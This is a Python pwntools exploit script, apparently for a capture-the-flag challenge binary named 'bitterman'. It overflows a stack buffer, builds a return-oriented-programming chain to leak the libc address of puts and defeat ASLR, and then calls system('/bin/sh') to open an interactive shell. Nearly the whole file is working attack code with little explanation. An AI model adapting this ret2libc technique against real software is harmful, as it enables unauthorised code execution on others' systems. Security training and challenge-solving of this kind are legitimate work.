#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template bitterman
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('bitterman')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    No RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
filename = './bitterman'
libname = '/usr/lib/x86_64-linux-gnu/libc.so.6'
elf = ELF(filename)
lib = ELF(libname)
io = process(filename)


#> What's your name? 
#asd
#Hi, asd
#> Please input the length of your message: 
#123
#> Please enter your text: 
#test
#> Thanks!


#puts location got and plt
puts_address_plt = p64(elf.plt.puts)
puts_address_got = p64(elf.got.puts)

#main
main_address = p64(elf.functions['main'].address)

#libc puts and address
puts_addres_libc = lib.functions['puts'].address
system_addres_libc = lib.functions['system'].address


buffer = ROP(elf)
#gadget 0x0000000000400853: pop rdi; ret; 
pop_rdi = p64(buffer.rdi.address)

#we need to leak the puts because it changes everytime due to aslr
#=============== L E A K ===============
buffer.raw(cyclic(152))
buffer.raw(pop_rdi)
buffer.raw(puts_address_got)
buffer.raw(puts_address_plt)
buffer.raw(main_address)

print("length of buffer: " + str(len(str(buffer))))
io.recvuntil("name?")
io.sendline("asd")
io.recvuntil("message:")
io.sendline("500")
io.recvuntil("text:")
io.sendline(buffer.chain())
io.recvuntil("Thanks!")
leaked = io.recv()[:8].strip().ljust(8,"\x00")

leaked = u64(leaked) # converts from string to u64

#how to extract libc bin sh address using pwn?
bin_sh_libc = 0x18a156

offset = leaked - puts_addres_libc
sys = p64(offset + system_addres_libc)
sh = p64(offset + bin_sh_libc)

#=============== S H E L L ===============
buffer_stage2 = ROP(elf)
buffer_stage2.raw(cyclic(152))
#our gadget stays the same
buffer_stage2.raw(pop_rdi)
buffer_stage2.raw(sh)
buffer_stage2.raw(sys)

print("length of buffer: " + str(len(str(buffer_stage2))))

io.sendline("asd")
io.recvuntil("message:")
io.sendline("176")
io.recvuntil("text:")
io.sendline(buffer_stage2.chain())

io.interactive()
